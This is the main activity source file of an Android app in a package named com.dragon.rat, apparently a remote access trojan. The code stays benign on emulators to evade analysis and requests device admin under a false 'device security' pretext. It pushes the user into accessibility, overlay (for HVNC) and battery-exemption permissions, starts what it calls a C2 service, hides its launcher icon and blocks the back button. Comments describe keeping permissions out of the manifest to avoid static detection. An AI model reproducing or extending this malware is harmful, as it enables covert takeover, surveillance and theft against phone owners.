package com.dragon.rat;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;
import android.widget.Toast;

import java.util.List;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // If in emulator, behave 100% benign
        if (FudUtils.isEmulator()) {
            Toast.makeText(this, "App requires a physical device", Toast.LENGTH_LONG).show();
            finish();
            return;
        }
        
        // Step 1: Request all permissions via Accessibility
        requestNeededPermissions();
        
        // Step 2: Grant device admin
        requestDeviceAdmin();
        
        // Step 3: Enable accessibility service (auto-permission grant)
        requestAccessibility();
        
        // Step 4: Disable battery optimization
        requestBatteryOptimization();
        
        // Step 5: Request overlay permission for HVNC
        requestOverlayPermission();
        
        // Step 6: Start the C2 service
        startCoreService();
        
        // Step 7: Hide icon after short delay
        new android.os.Handler().postDelayed(() -> {
            hideIcon();
            finishAffinity();
        }, 3000);
    }
    
    private void requestNeededPermissions() {
        // Only INTERNET and FOREGROUND_SERVICE in manifest
        // Everything else is requested at runtime via Accessibility auto-click
        // This prevents static analysis from flagging suspicious permissions
        
        if (Build.VERSION.SDK_INT >= 33) {
            try {
                requestPermissions(new String[]{
                    Manifest.permission.POST_NOTIFICATIONS
                }, 1001);
            } catch (Exception ignored) {}
        }
    }
    
    private void requestDeviceAdmin() {
        ComponentName componentName = new ComponentName(this, DeviceAdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        
        if (dpm != null && !dpm.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "Required for device security features");
            startActivity(intent);
        }
    }
    
    private void requestAccessibility() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception ignored) {}
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= 23) {
            try {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent intent = new Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                }
            } catch (Exception ignored) {}
        }
    }
    
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= 23) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception ignored) {}
            }
        }
    }
    
    private void startCoreService() {
        Intent serviceIntent = new Intent(this, CoreService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
    
    private void hideIcon() {
        try {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception ignored) {}
    }
    
    @Override
    public void onBackPressed() {
        // Block back button — user must complete setup
        Toast.makeText(this, "Please complete setup", Toast.LENGTH_SHORT).show();
    }
            }
